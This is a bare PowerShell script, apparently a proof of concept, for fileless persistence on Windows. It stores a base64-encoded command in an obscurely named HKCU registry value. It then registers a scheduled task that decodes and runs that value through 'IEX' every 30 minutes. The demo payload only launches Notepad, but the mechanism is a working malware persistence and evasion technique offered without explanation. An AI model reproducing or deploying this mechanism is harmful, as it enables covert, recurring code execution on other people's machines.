$regKeyName = "Pvoeooxf"
$regKeyValueName = "ysadsamdsad"
$regKeyPath = Join-Path -Path "HKCU:\SOFTWARE\" -ChildPath $regKeyName

$ind = Test-Path $regKeyPath

if($ind){
Remove-Item -Path $regKeyPath -Recurse
}

Write-Host "Registry key " $regKeyPath " not found. Creating it..." -ForegroundColor Yellow
New-Item -Path "HKCU:\SOFTWARE\" -Name $regKeyName
New-ItemProperty -Path $regKeyPath -Name $regKeyValueName -PropertyType String

$Text = "C:\Windows\System32\notepad.exe"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText=[Convert]::ToBase64String($Bytes)
Set-ItemProperty -Path $regKeyPath -Name $regKeyValueName -Value $EncodedText
$Script = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\Pvoeooxf).ysadsamdsad))

schtasks.exe /create /f /tn "testing" /TR "cmd /c powershell.exe IEX -Command($script)" /SC MINUTE /MO 30



